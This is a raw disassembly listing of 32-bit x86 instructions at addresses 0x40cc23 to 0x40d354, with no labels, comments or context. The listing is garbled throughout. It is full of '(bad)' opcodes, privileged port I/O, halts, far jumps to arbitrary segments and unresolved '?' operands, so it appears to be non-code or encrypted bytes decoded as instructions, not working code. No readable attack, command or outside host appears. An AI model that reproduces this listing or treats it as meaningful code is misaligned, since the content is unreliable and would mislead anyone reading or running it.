  40cc23:	xchg   edi,eax
  40cc24:	mov    bl,0xb0
  40cc26:	cwde   
  40cc27:	mov    ah,0xa1
  40cc29:	pusha  
  40cc2a:	in     al,dx
  40cc2b:	mov    ds:0xc8e4dc6e,al
  40cc30:	js     0x40ccac
  40cc32:	stos   DWORD PTR es:[edi],eax
  40cc33:	fwait
  40cc34:	inc    ebp
  40cc35:	jae    0x40cc27
  40cc37:	jp     0x40cc5b
  40cc39:	cmp    al,0x24
  40cc3b:	push   ebp
  40cc3c:	mov    dh,0x8a
  40cc3e:	cld    
  40cc3f:	jmp    0xb05:0xb6061d64
  40cc46:	push   ebp
  40cc47:	hlt    
  40cc48:	or     edi,ebp
  40cc4a:	shl    DWORD PTR [esi-0x25],0x62
  40cc4e:	sub    al,0xc3
  40cc50:	lods   al,BYTE PTR ds:[esi]
  40cc51:	(bad)  
  40cc52:	sbb    al,0x32
  40cc54:	jne    0x40cc76
  40cc56:	push   edx
  40cc57:	pop    ebp
  40cc58:	in     al,0x5b
  40cc5a:	mov    bl,0x0
  40cc5c:	int    0xe2
  40cc5e:	dec    ecx
  40cc5f:	out    dx,al
  40cc60:	sbb    ah,BYTE PTR [esi+0x4cce381]
  40cc66:	sub    bl,BYTE PTR ds:[ebx-0x20]
  40cc6a:	pop    ebx
  40cc6b:	push   cs
  40cc6c:	sbb    al,0x5a
  40cc6e:	dec    ebx
  40cc6f:	shl    BYTE PTR [ecx-0x7d56754e],1
  40cc75:	cmp    ecx,ebx
  40cc77:	in     eax,dx
  40cc78:	dec    esi
  40cc7a:	sbb    cl,BYTE PTR es:[ecx+edx*2-0x24]
  40cc7f:	int3   
  40cc80:	mov    edx,0xb24de1eb
  40cc85:	fucomi st,st(6)
  40cc87:	fwait
  40cc88:	outs   dx,DWORD PTR ds:[esi]
  40cc89:	push   ecx
  40cc8a:	(bad)  
  40cc8b:	(bad)  
  40cc8d:	xor    BYTE PTR [ebp+0x2b],dl
  40cc90:	fwait
  40cc91:	jne    0x40cd07
  40cc93:	clc    
  40cc94:	outs   dx,DWORD PTR ds:[esi]
  40cc95:	xchg   DWORD PTR [eax-0x4c892125],esp
  40cc9b:	(bad)  
  40cc9d:	push   cs
  40cc9e:	(bad)
  40cca1:	fnstcw WORD PTR [edx-0x7deb0cf1]
  40cca7:	cmp    edx,DWORD PTR [edi]
  40cca9:	les    edx,FWORD PTR [ebx+ecx*1+0x3ab605a5]
  40ccb0:	mov    ds:0xe2e2ff5a,eax
  40ccb5:	iret   
  40ccb6:	cmp    al,0x29
  40ccb8:	aas    
  40ccb9:	or     eax,0x109b368a
  40ccbe:	xor    ecx,ebx
  40ccc0:	mov    fs,WORD PTR [ecx+0x0]
  40ccc3:	add    al,0x5c
  40ccc5:	inc    eax
  40ccc6:	test   al,0x8b
  40ccc8:	push   eax
  40ccc9:	xor    BYTE PTR [ebp+esi*4+0x3c3c6151],ch
  40ccd0:	enter  0x320f,0x93
  40ccd4:	call   0xcdb0:0x898e175c
  40ccdb:	(bad)  
  40ccdc:	mov    eax,eax
  40ccde:	mov    ds:0x463f358b,al
  40cce3:	call   0x4494:0x643f1dd1
  40ccea:	outs   dx,DWORD PTR ds:[esi]
  40cceb:	shl    cl,0x96
  40ccee:	xchg   ebp,eax
  40ccef:	inc    ebp
  40ccf0:	mov    ds:0x365b12d9,al
  40ccf5:	jae    0x40cd27
  40ccf7:	adc    eax,0xf2ef8aee
  40ccfc:	lods   eax,DWORD PTR ds:[esi]
  40ccfd:	popa   
  40ccfe:	mov    dl,0x8f
  40cd00:	not    edi
  40cd02:	cmp    dl,cl
  40cd04:	push   edx
  40cd05:	adc    DWORD PTR [eax-0x40],0xffffffff
  40cd09:	xchg   edx,eax
  40cd0a:	loope  0x40cd1c
  40cd0c:	xchg   BYTE PTR [ebx+0x7c6fdba3],cl
  40cd12:	pop    esp
  40cd13:	inc    eax
  40cd14:	add    BYTE PTR [ecx+0x62],al
  40cd17:	xor    edx,DWORD PTR [edx+edx*8]
  40cd1a:	and    ch,dl
  40cd1c:	and    al,0xee
  40cd1e:	add    edi,DWORD PTR [ebx-0x2e]
  40cd21:	or     DWORD PTR [ebx+0x7b91eb20],ebp
  40cd27:	scas   al,BYTE PTR es:[edi]
  40cd28:	inc    esi
  40cd29:	aam    0xf0
  40cd2b:	sar    DWORD PTR [edi-0x6450d6e6],0xee
  40cd32:	inc    ecx
  40cd33:	sbb    eax,0xb411244c
  40cd38:	jmp    0x67a9638a
  40cd3d:	int3   
  40cd3e:	das    
  40cd3f:	inc    ecx
  40cd40:	pop    ebx
  40cd41:	cmp    ebx,DWORD PTR [edx+edi*1+0x46]
  40cd45:	loope  0x40cd25
  40cd47:	mov    eax,ds:0x2ddb9673
  40cd4c:	loope  0x40ccd5
  40cd4e:	cld    
  40cd4f:	gs xor eax,0xdf4ff54f
  40cd55:	(bad)  
  40cd56:	adc    ebp,DWORD PTR [ecx+0x7cd8f087]
  40cd5c:	mov    edx,?
  40cd5e:	push   es
  40cd5f:	ss cmp eax,ecx
  40cd62:	in     al,dx
  40cd63:	ins    DWORD PTR es:[edi],dx
  40cd64:	add    dl,BYTE PTR [edi]
  40cd66:	icebp  
  40cd67:	inc    ecx
  40cd68:	push   cs
  40cd69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd6a:	xchg   esp,eax
  40cd6b:	push   ds
  40cd6c:	xchg   edi,eax
  40cd6d:	mov    ecx,0xfd894a01
  40cd72:	popa   
  40cd73:	gs xor esp,edi
  40cd76:	fnstsw ax
  40cd78:	lds    edi,FWORD PTR [eax]
  40cd7a:	pusha  
  40cd7b:	jb     0x40cd3e
  40cd7d:	int    0xb3
  40cd7f:	jmp    0x54cb:0xd3679778
  40cd86:	add    al,0xa9
  40cd88:	pop    ebx
  40cd89:	(bad)  
  40cd8a:	ins    DWORD PTR es:[edi],dx
  40cd8b:	xchg   BYTE PTR [eax],bl
  40cd8d:	sbb    ebx,DWORD PTR [edx+0x25aa7bfd]
  40cd93:	mov    edi,0xe166bf68
  40cd98:	mov    ecx,DWORD PTR [edx+0x1b]
  40cd9b:	sub    al,0xbc
  40cd9d:	ss int3 
  40cd9f:	popaw  
  40cda1:	or     esp,DWORD PTR [esi]
  40cda3:	inc    eax
  40cda4:	or     eax,esi
  40cda6:	jmp    0xb04d:0x2c57918b
  40cdad:	fs mov ebx,0xb8224554
  40cdb3:	push   edx
  40cdb4:	ficom  WORD PTR [ecx-0x59d3b705]
  40cdba:	push   eax
  40cdbb:	push   ss
  40cdbc:	add    al,0x21
  40cdbe:	adc    dh,0x89
  40cdc1:	mov    BYTE PTR [ecx+0x1b],dl
  40cdc4:	nop
  40cdc5:	mov    bl,0x82
  40cdc7:	inc    esp
  40cdc8:	das    
  40cdc9:	push   edx
  40cdca:	dec    eax
  40cdcb:	xor    eax,0x4e46dd9b
  40cdd0:	jae    0x40cd8d
  40cdd2:	test   al,0xd9
  40cdd4:	or     eax,0x5a0cbacc
  40cdd9:	fdivrp st(5),st
  40cddb:	adc    al,0x91
  40cddd:	mov    ds:0x887d070d,eax
  40cde2:	and    cl,BYTE PTR [ebx]
  40cde4:	fcom   st(5)
  40cde6:	push   esi
  40cde7:	or     DWORD PTR [ebx],ecx
  40cde9:	or     edi,edi
  40cdeb:	arpl   WORD PTR [esi+0x1],sp
  40cdee:	outs   dx,DWORD PTR ds:[esi]
  40cdef:	js     0x40cd7d
  40cdf1:	sbb    eax,0xdc0c9e3e
  40cdf6:	ret    
  40cdf7:	jmp    0x40ce33
  40cdf9:	pop    esi
  40cdfa:	retf   0x3f94
  40cdfd:	loopne 0x40cdfb
  40cdff:	sbb    ebx,ebx
  40ce01:	js     0x40ce6a
  40ce03:	mov    fs,WORD PTR [edx]
  40ce05:	mov    ebp,0x581876ae
  40ce0a:	outs   dx,DWORD PTR ds:[esi]
  40ce0b:	arpl   WORD PTR [ebx-0x42cf18e0],si
  40ce11:	push   eax
  40ce12:	call   0xd361:0x2f2fcf56
  40ce19:	jb     0x40ce6f
  40ce1b:	pusha  
  40ce1c:	popa   
  40ce1d:	rcl    DWORD PTR [edx],0x23
  40ce20:	iret   
  40ce21:	or     bh,BYTE PTR ds:0xaddd360f
  40ce27:	add    DWORD PTR [edi],ecx
  40ce29:	(bad)  
  40ce2a:	sbb    BYTE PTR [ecx+0x3e],ch
  40ce2d:	add    BYTE PTR [ecx+0x4e],0xa6
  40ce31:	sbb    al,cl
  40ce33:	add    dh,BYTE PTR [edi+ebp*4]
  40ce36:	sbb    DWORD PTR [eax+0x70],ebp
  40ce39:	push   ebp
  40ce3a:	inc    edx
  40ce3b:	jne    0x40ceb0
  40ce3d:	push   es
  40ce3e:	and    bh,BYTE PTR [esi+ecx*2-0x6159eeb6]
  40ce45:	stc    
  40ce46:	dec    esi
  40ce47:	mov    ebp,0xc4207258
  40ce4c:	mov    eax,DWORD PTR [ebp-0x1d828d34]
  40ce52:	fidivr DWORD PTR [ebx-0x26]
  40ce55:	ins    BYTE PTR es:[edi],dx
  40ce56:	test   DWORD PTR [edx],ecx
  40ce58:	fcomip st,st(5)
  40ce5a:	aas    
  40ce5b:	test   DWORD PTR [edx-0x4e],0xe0fdba62
  40ce62:	lods   eax,DWORD PTR ds:[esi]
  40ce63:	adc    DWORD PTR [ecx+0x214f7a22],ebp
  40ce69:	fcmovnu st,st(6)
  40ce6b:	jae    0x40ce2e
  40ce6d:	mov    ah,0x1b
  40ce6f:	daa    
  40ce70:	xor    cl,BYTE PTR [ebx]
  40ce72:	sahf   
  40ce73:	ret    
  40ce74:	inc    esp
  40ce75:	repnz test BYTE PTR [edx+0x49],ch
  40ce79:	xor    al,0x45
  40ce7b:	adc    ah,BYTE PTR [eax+0x32ab7753]
  40ce81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce82:	add    DWORD PTR [edi],edx
  40ce84:	test   al,0xb5
  40ce86:	mov    edx,0x2b9f1ab2
  40ce8b:	fist   DWORD PTR [esi]
  40ce8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce8e:	cmp    edx,DWORD PTR [edi-0x75]
  40ce91:	jb     0x40ce79
  40ce93:	or     DWORD PTR [eax+0x56],esp
  40ce96:	rol    edi,1
  40ce98:	sbb    edi,DWORD PTR [ebp+0x28]
  40ce9b:	call   0x4639a4cd
  40cea0:	std    
  40cea1:	cmc    
  40cea2:	repz add bh,dl
  40cea5:	push   eax
  40cea6:	push   0x62abe50d
  40ceab:	or     eax,0x6d496ecb
  40ceb0:	xchg   esp,eax
  40ceb1:	jl     0x40ce71
  40ceb3:	es add eax,0x7793bd76
  40ceb9:	shl    DWORD PTR [ecx],0x3c
  40cebc:	test   al,0x8d
  40cebe:	fiadd  WORD PTR [esi]
  40cec0:	push   esp
  40cec1:	pop    ecx
  40cec2:	jne    0x40ce54
  40cec4:	scas   eax,DWORD PTR es:[edi]
  40cec5:	add    al,0x2d
  40cec8:	dec    ecx
  40cec9:	ja     0x40ce72
  40cecb:	out    dx,al
  40cecc:	(bad)  
  40cecd:	fsubr  DWORD PTR [edx]
  40cecf:	mov    ecx,0xae28d4b5
  40ced4:	cli    
  40ced5:	test   DWORD PTR [eax+edx*8],ebp
  40ced8:	xor    BYTE PTR [esi],0x21
  40cedb:	adc    BYTE PTR [eax+eiz*1],0x51
  40cedf:	sbb    cl,BYTE PTR [ecx-0x17]
  40cee2:	test   al,0x20
  40cee4:	dec    edi
  40cee5:	jl     0x40cf45
  40cee7:	jle    0x40ceee
  40cee9:	stos   DWORD PTR es:[edi],eax
  40ceea:	dec    edi
  40ceeb:	stc    
  40ceec:	cmp    DWORD PTR [edi+0x36bec25d],edx
  40cef2:	adc    al,0xd
  40cef4:	icebp  
  40cef5:	push   ecx
  40cef6:	xor    BYTE PTR [edx+0x7c],0x97
  40cefa:	int3   
  40cefb:	icebp  
  40cefc:	fadd   DWORD PTR [ecx-0x31b149e4]
  40cf02:	daa    
  40cf03:	ss jp  0x40ceed
  40cf06:	gs jo  0x40cee3
  40cf09:	(bad)  
  40cf0a:	ficomp DWORD PTR [edx]
  40cf0c:	loop   0x40cefd
  40cf0e:	std    
  40cf0f:	mov    edi,0xe083945d
  40cf14:	push   ebp
  40cf15:	pop    ecx
  40cf16:	lods   al,BYTE PTR ds:[esi]
  40cf17:	mov    edx,0x9800f117
  40cf1c:	(bad)  
  40cf1d:	jg     0x40cec2
  40cf1f:	not    edi
  40cf21:	sub    DWORD PTR [ebp-0x51d96508],esp
  40cf27:	aas    
  40cf28:	mov    al,0xb9
  40cf2a:	inc    ebx
  40cf2b:	cld    
  40cf2c:	adc    BYTE PTR [edx+0x390ca4f6],ah
  40cf32:	(bad)  
  40cf33:	(bad)  
  40cf34:	iret   
  40cf35:	cmp    edx,DWORD PTR [ebp+0x117f7c98]
  40cf3b:	cmp    al,0x93
  40cf3d:	sub    BYTE PTR [edi],ch
  40cf3f:	loope  0x40cf57
  40cf41:	adc    BYTE PTR [eax+0x5c],ch
  40cf44:	ret    
  40cf45:	jb     0x40cf5d
  40cf47:	idiv   DWORD PTR [esi+ebx*8-0x174b841f]
  40cf4e:	retf   0x946b
  40cf51:	out    0xe4,al
  40cf53:	jo     0x40cf60
  40cf55:	pusha  
  40cf56:	or     BYTE PTR [edx],bl
  40cf58:	stos   DWORD PTR es:[edi],eax
  40cf59:	pusha  
  40cf5a:	aas    
  40cf5b:	stos   DWORD PTR es:[edi],eax
  40cf5c:	inc    esp
  40cf5d:	sbb    cl,BYTE PTR [ebx-0x6f27c7cf]
  40cf63:	cmp    eax,0xa827afce
  40cf68:	test   eax,0xddaf75a9
  40cf6d:	push   ecx
  40cf6e:	call   0x1c51:0x9726e3ad
  40cf75:	mov    esp,0xf321b7cb
  40cf7a:	fstp   QWORD PTR [esi]
  40cf7c:	jno    0x40cff7
  40cf7e:	lock xor al,0x34
  40cf82:	mov    dh,0x8b
  40cf84:	neg    BYTE PTR [ecx-0x1e]
  40cf87:	dec    edi
  40cf88:	inc    ebp
  40cf89:	popf   
  40cf8a:	jle    0x40cf6b
  40cf8c:	(bad)  
  40cf8d:	inc    esp
  40cf8e:	mov    ch,cl
  40cf90:	cli    
  40cf91:	repz push ebp
  40cf93:	or     ah,BYTE PTR [ecx-0x21985f87]
  40cf99:	daa    
  40cf9a:	lds    eax,FWORD PTR [ebp+0x1cf62a78]
  40cfa0:	loopne 0x40cfe9
  40cfa2:	mov    edi,0x780b6190
  40cfa7:	inc    eax
  40cfa8:	das    
  40cfa9:	into   
  40cfaa:	les    edx,FWORD PTR [eax+0x10]
  40cfad:	cli    
  40cfae:	scas   al,BYTE PTR es:[edi]
  40cfaf:	outs   dx,DWORD PTR ds:[esi]
  40cfb0:	test   eax,0x5285f53c
  40cfb5:	ds xchg esi,eax
  40cfb7:	push   es
  40cfb8:	loope  0x40d018
  40cfba:	and    DWORD PTR [eax],edi
  40cfbc:	in     eax,dx
  40cfbd:	jmp    0x193df287
  40cfc2:	adc    ebx,esp
  40cfc4:	cmp    DWORD PTR [esi],esi
  40cfc6:	push   cs
  40cfc7:	jbe    0x40cff9
  40cfc9:	and    BYTE PTR [edx+0x3695d6c3],bh
  40cfcf:	mov    bh,0xcf
  40cfd1:	xchg   ebx,eax
  40cfd2:	push   ds
  40cfd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfd4:	mov    cl,0x36
  40cfd6:	test   edx,edx
  40cfd8:	repnz lods eax,DWORD PTR ds:[esi]
  40cfda:	outs   dx,BYTE PTR ds:[esi]
  40cfdb:	rcr    BYTE PTR [ebx],1
  40cfdd:	jb     0x40d034
  40cfdf:	dec    esi
  40cfe0:	rcr    BYTE PTR [ebx],1
  40cfe2:	rol    ebp,cl
  40cfe4:	jle    0x40cf67
  40cfe6:	mov    eax,0xa5b0a4e4
  40cfeb:	arpl   WORD PTR [edx],si
  40cfed:	xor    eax,0x718feafe
  40cff2:	xor    esp,esi
  40cff4:	sbb    al,0x82
  40cff6:	scas   eax,DWORD PTR es:[edi]
  40cff7:	idiv   BYTE PTR [ebx+0x12]
  40cffa:	pusha  
  40cffb:	aaa    
  40cffc:	mov    dl,0x74
  40cffe:	int    0xc9
  40d000:	popf   
  40d001:	sub    edx,DWORD PTR [edx+0x7a53a65d]
  40d007:	inc    edx
  40d008:	add    esp,DWORD PTR [ebx-0x32]
  40d00b:	dec    ebp
  40d00c:	aas    
  40d00d:	mov    DWORD PTR [ebx],ebx
  40d00f:	es cmp al,0x41
  40d012:	(bad)
  40d016:	inc    ebp
  40d018:	pop    ecx
  40d019:	rcl    ch,0x1d
  40d01c:	scas   al,BYTE PTR es:[edi]
  40d01d:	shl    BYTE PTR [edx+0x33],cl
  40d020:	mov    edi,?
  40d022:	sar    BYTE PTR [edi+0x35070627],cl
  40d028:	iret   
  40d029:	xchg   BYTE PTR [eax],dl
  40d02b:	mov    esi,0xaaf2941a
  40d030:	retf   0xea2d
  40d033:	or     BYTE PTR [esi+eax*2],dh
  40d036:	mov    esp,0xc18d704a
  40d03b:	jmp    0x19b1:0x2e126c3a
  40d042:	xor    ebp,esp
  40d044:	mov    dl,0x77
  40d046:	xchg   ebx,eax
  40d047:	das    
  40d048:	out    0xfb,eax
  40d04a:	bound  ebp,QWORD PTR [esp+edi*2-0x503f6667]
  40d051:	mov    dl,0xd5
  40d053:	pop    edi
  40d054:	es leavew 
  40d057:	in     eax,0x7
  40d059:	xchg   ecx,eax
  40d05a:	mov    eax,0xb4a492e8
  40d05f:	ficomp WORD PTR [edi-0x54]
  40d062:	jb     0x40d0c6
  40d064:	(bad)  
  40d065:	mov    ah,0x83
  40d067:	mov    dl,0x2e
  40d069:	stc    
  40d06a:	jno    0x40d0b2
  40d06c:	adc    eax,0x794c7ce8
  40d071:	adc    eax,0x78526385
  40d076:	push   ss
  40d077:	and    esi,ecx
  40d079:	inc    edi
  40d07a:	cmp    ch,BYTE PTR [esi]
  40d07c:	ins    BYTE PTR es:[edi],dx
  40d07d:	pop    esp
  40d07e:	mov    al,0xe1
  40d080:	(bad)  
  40d081:	(bad)  
  40d082:	lea    esi,[ebp+0x7df12c3c]
  40d088:	pushf  
  40d089:	xchg   esi,eax
  40d08a:	fsubr  QWORD PTR [ebp+0x62]
  40d08d:	jge    0x40d023
  40d08f:	lods   al,BYTE PTR ds:[esi]
  40d090:	dec    edx
  40d091:	sar    DWORD PTR [ebx-0x31],0x26
  40d095:	xor    al,0xea
  40d097:	or     al,0xac
  40d099:	mov    bh,0x8f
  40d09b:	arpl   WORD PTR [ebx-0x7d],cx
  40d09e:	lods   al,BYTE PTR ds:[esi]
  40d09f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0a0:	hlt    
  40d0a1:	std    
  40d0a2:	dec    edx
  40d0a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0a4:	mov    al,0x37
  40d0a6:	pop    edi
  40d0a7:	es cmp eax,0xecedfce6
  40d0ad:	outs   dx,BYTE PTR ds:[esi]
  40d0ae:	jnp    0x40d03b
  40d0b0:	sbb    DWORD PTR [eax],0x5a8ed760
  40d0b6:	and    BYTE PTR [eax-0xd0c245f],cl
  40d0bc:	jns    0x40d077
  40d0be:	jmp    0x40d0ec
  40d0c0:	fidivr DWORD PTR [edi+0x5ef92397]
  40d0c6:	mov    ?,WORD PTR [esi+eax*8-0x2d]
  40d0ca:	adc    ecx,DWORD PTR [ebx+0x54]
  40d0cd:	push   edi
  40d0ce:	out    dx,al
  40d0cf:	into   
  40d0d0:	ret    
  40d0d1:	push   ebx
  40d0d2:	and    ebx,DWORD PTR [ebp-0x10]
  40d0d5:	sbb    eax,0x9a389e15
  40d0da:	add    dh,BYTE PTR [esi-0x25]
  40d0dd:	sbb    bl,BYTE PTR [edi-0x6a23f3e2]
  40d0e3:	test   BYTE PTR [eax],dl
  40d0e5:	cmp    BYTE PTR ds:0x3123caa9,dl
  40d0eb:	add    edx,edi
  40d0ed:	leave  
  40d0ee:	sub    BYTE PTR [edx],bh
  40d0f0:	xlat   BYTE PTR ds:[ebx]
  40d0f1:	mov    ecx,0x6b0ff078
  40d0f6:	in     al,0x7
  40d0f8:	mov    ds:0x588bce91,al
  40d0fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0fe:	icebp  
  40d0ff:	imul   ebp,DWORD PTR [ecx+0x75],0xa020f8d1
  40d106:	pop    ss
  40d107:	repz and al,0xed
  40d10a:	pusha  
  40d10b:	sub    DWORD PTR [edx+ebp*2],esp
  40d10e:	les    edx,FWORD PTR [eax]
  40d110:	shr    BYTE PTR [ecx+esi*4+0x7fec97f],0x61
  40d118:	jno    0x40d18b
  40d11a:	std    
  40d11b:	pop    es
  40d11c:	hlt    
  40d11d:	repnz pop es
  40d11f:	push   ebx
  40d120:	outs   dx,DWORD PTR ds:[esi]
  40d121:	xlat   BYTE PTR ds:[ebx]
  40d122:	scas   al,BYTE PTR es:[edi]
  40d123:	pop    esp
  40d124:	sub    ebx,DWORD PTR [esi]
  40d126:	iret   
  40d127:	out    0xdc,al
  40d129:	lds    ebp,FWORD PTR [ebx-0x14]
  40d12c:	mov    ds:0x42a030de,eax
  40d131:	mov    ch,0x3e
  40d133:	aaa    
  40d134:	xlat   BYTE PTR ds:[ebx]
  40d135:	repz dec esi
  40d137:	mov    bh,0x7a
  40d139:	test   eax,0x72c3c29a
  40d13e:	imul   dl
  40d140:	aam    0x36
  40d142:	pop    edx
  40d143:	das    
  40d144:	das    
  40d145:	sbb    ecx,DWORD PTR [edx+0x66f1f91c]
  40d14b:	pop    ebp
  40d14c:	inc    eax
  40d14d:	add    cl,bl
  40d14f:	fisub  DWORD PTR [ecx+0x763ce493]
  40d155:	cli    
  40d156:	addr16 push 0xffffffbd
  40d159:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d15a:	jae    0x40d176
  40d15c:	jl     0x40d11e
  40d15e:	jp     0x40d1c1
  40d160:	or     ebp,eax
  40d162:	les    ebp,FWORD PTR [edi+0x66a09b11]
  40d168:	dec    edi
  40d169:	outs   dx,BYTE PTR ds:[esi]
  40d16a:	pop    ebp
  40d16b:	mov    eax,ds:0x50e324c9
  40d170:	mov    bl,0x52
  40d172:	or     al,0xa3
  40d174:	xor    BYTE PTR [ebx+0x7cc79fec],ah
  40d17a:	xor    al,0x75
  40d17c:	out    dx,al
  40d17d:	or     al,0x56
  40d17f:	push   0x74bf7a89
  40d184:	pop    edx
  40d185:	daa    
  40d186:	mov    bl,0x88
  40d188:	sub    al,BYTE PTR [ecx-0x3e]
  40d18b:	mov    ebx,DWORD PTR [ecx+eax*2-0x3e]
  40d18f:	rcl    ebp,cl
  40d191:	jns    0x40d18d
  40d193:	dec    eax
  40d194:	dec    DWORD PTR [ecx-0x7e]
  40d197:	adc    cl,cl
  40d199:	or     eax,DWORD PTR [ecx-0xbf254d5]
  40d19f:	cld    
  40d1a0:	mov    cl,0xba
  40d1a2:	xor    BYTE PTR [eax],ah
  40d1a4:	mov    esi,0xd35843c9
  40d1a9:	arpl   WORD PTR [edx+0x29],sp
  40d1ac:	sbb    eax,0x7b54d281
  40d1b1:	mov    WORD PTR [esi+0x63c315a3],?
  40d1b7:	imul   eax,ebp,0x63389a48
  40d1bd:	lahf   
  40d1be:	inc    esp
  40d1bf:	aas    
  40d1c0:	js     0x40d168
  40d1c2:	out    dx,eax
  40d1c3:	add    eax,0xf3fd2c86
  40d1c8:	mov    esp,0x4bdca8ab
  40d1cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1ce:	or     edi,edi
  40d1d0:	repz imul ebx,DWORD PTR [edi-0x3792d661],0xf94e4d2a
  40d1db:	js     0x40d1d4
  40d1dd:	sub    BYTE PTR [edx-0x27],0x88
  40d1e1:	push   cs
  40d1e2:	mov    al,ds:0xb9735a0e
  40d1e7:	out    0xc5,al
  40d1e9:	mov    edi,0xda2c578e
  40d1ee:	add    DWORD PTR [ecx+eax*2-0x14],ebx
  40d1f2:	ret    0xa642
  40d1f5:	jle    0x40d249
  40d1f7:	imul   bh
  40d1f9:	add    al,0x0
  40d1fb:	push   esi
  40d1fc:	sbb    DWORD PTR [edi],esp
  40d1fe:	mov    ecx,ecx
  40d200:	sahf   
  40d201:	je     0x40d198
  40d203:	gs scas eax,DWORD PTR es:[edi]
  40d205:	(bad)  
  40d207:	xor    al,0x66
  40d209:	mov    edx,0xcddce22
  40d20e:	mov    dl,0x82
  40d210:	(bad)  
  40d213:	pop    esp
  40d214:	popa   
  40d215:	mov    ch,0xca
  40d217:	popf   
  40d218:	popf   
  40d219:	pop    esp
  40d21a:	cwde   
  40d21b:	iret   
  40d21c:	push   0xffffff90
  40d21e:	mov    edi,0x9a7fce1f
  40d223:	pop    es
  40d224:	ror    BYTE PTR [esi+0x2d],1
  40d227:	push   cs
  40d228:	scas   al,BYTE PTR es:[edi]
  40d229:	jo     0x40d1cd
  40d22b:	inc    edi
  40d22c:	xor    esp,DWORD PTR [esi]
  40d22e:	jg     0x40d1eb
  40d230:	scas   eax,DWORD PTR es:[edi]
  40d231:	adc    eax,0x9032bb59
  40d236:	sahf   
  40d237:	push   0xb
  40d239:	sbb    al,0x33
  40d23b:	push   esi
  40d23c:	popa   
  40d23d:	mov    ch,0xdb
  40d23f:	xchg   edx,eax
  40d240:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d241:	push   es
  40d242:	call   0xc38c212f
  40d247:	pop    eax
  40d248:	and    al,BYTE PTR [ecx+ebp*4-0x54f2cde3]
  40d24f:	push   esi
  40d250:	dec    ecx
  40d251:	push   ebp
  40d252:	add    BYTE PTR [ebp-0x27e76377],ch
  40d258:	shl    BYTE PTR [edi+0x51],1
  40d25b:	cs ins DWORD PTR es:[edi],dx
  40d25d:	lea    ebp,[edx+0x2c]
  40d260:	or     eax,esp
  40d262:	dec    edx
  40d263:	adc    eax,0x3915ca62
  40d268:	retf   
  40d269:	pop    ebx
  40d26a:	mov    ch,0x3b
  40d26c:	sub    edi,DWORD PTR [edi+0x7cbec59c]
  40d272:	scas   al,BYTE PTR es:[edi]
  40d273:	cli    
  40d274:	sbb    ebp,DWORD PTR [ecx+0x18]
  40d277:	ds push ss
  40d279:	xchg   edx,eax
  40d27a:	das    
  40d27b:	cmp    BYTE PTR [ecx+0x7d],ah
  40d27e:	inc    edi
  40d27f:	addr16 add eax,0x704aef17
  40d285:	jns    0x40d22d
  40d287:	cwde   
  40d288:	pop    ds
  40d289:	or     edx,DWORD PTR [esi]
  40d28b:	retf   0x7ddb
  40d28e:	scas   eax,DWORD PTR es:[edi]
  40d28f:	ret    0x2097
  40d292:	(bad)  
  40d293:	xor    eax,0xad892a2
  40d298:	outs   dx,BYTE PTR ds:[esi]
  40d299:	push   edi
  40d29a:	in     al,dx
  40d29b:	xchg   esi,eax
  40d29c:	sub    al,0x17
  40d29e:	push   cs
  40d29f:	jge    0x40d2fa
  40d2a1:	ror    BYTE PTR [eax],0x86
  40d2a4:	retf   
  40d2a5:	cmp    ch,BYTE PTR [edi+0x6fae8550]
  40d2ab:	lahf   
  40d2ac:	lock sbb DWORD PTR [ebx-0x67dc04cb],esp
  40d2b3:	mov    edi,0x42da2022
  40d2b8:	jno    0x40d2f5
  40d2ba:	pop    eax
  40d2bb:	xchg   ecx,eax
  40d2bc:	test   DWORD PTR [esi+ebx*8-0x22],0xfd1d4437
  40d2c4:	rcr    BYTE PTR [edx+0x5b],0xad
  40d2c8:	pop    ss
  40d2c9:	(bad)  
  40d2cb:	icebp  
  40d2cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2cd:	stos   BYTE PTR es:[edi],al
  40d2ce:	lods   eax,DWORD PTR ds:[esi]
  40d2cf:	or     eax,0x2627e2e2
  40d2d4:	push   ecx
  40d2d5:	mov    ebx,0xd3b89b0e
  40d2db:	and    cl,dh
  40d2dd:	mov    al,ds:0x76655b3c
  40d2e2:	out    0x17,eax
  40d2e4:	retf   0x995d
  40d2e7:	push   ebx
  40d2e8:	(bad)  
  40d2e9:	cmp    al,0xba
  40d2eb:	data16 daa 
  40d2ed:	pop    ds
  40d2ee:	adc    ecx,DWORD PTR [ecx+ebp*4+0x1b7a1ef5]
  40d2f5:	fwait
  40d2f6:	sub    eax,0x6836bafd
  40d2fb:	mov    ds:0x8df56ebc,eax
  40d300:	mov    ah,0x82
  40d302:	xchg   esi,eax
  40d303:	cdq    
  40d304:	inc    esi
  40d305:	mov    edi,0x7d99eabf
  40d30a:	and    al,0x44
  40d30c:	fist   WORD PTR [esi+0x18]
  40d30f:	cmp    BYTE PTR [ebp-0x37],cl
  40d312:	mov    bl,0x5d
  40d314:	push   esp
  40d315:	mov    ds:0x6e5994d4,al
  40d31a:	out    dx,eax
  40d31b:	mov    ebp,ss
  40d31d:	sbb    bl,dh
  40d31f:	mov    dl,0x75
  40d321:	(bad)  
  40d322:	shr    DWORD PTR [ebx-0x4483b5dd],1
  40d328:	out    dx,eax
  40d329:	cli    
  40d32a:	mov    ebx,0x584dce5a
  40d32f:	pop    edx
  40d330:	and    al,0x33
  40d332:	pop    es
  40d333:	cmp    eax,0x30a538cf
  40d338:	dec    esi
  40d339:	mov    dh,0xc9
  40d33b:	xchg   ecx,eax
  40d33c:	fstp   DWORD PTR [ecx]
  40d33e:	xor    bl,BYTE PTR [ebp+0x3d]
  40d341:	jmp    0x40d381
  40d343:	mov    ecx,0x3f0dd00b
  40d348:	jg     0x40d37e
  40d34a:	mov    dl,0x1e
  40d34c:	(bad)  
  40d34d:	(bad)  
  40d34e:	fisub  WORD PTR [esi-0x707f6e46]
  40d354:	adc    eax,0xa501793c
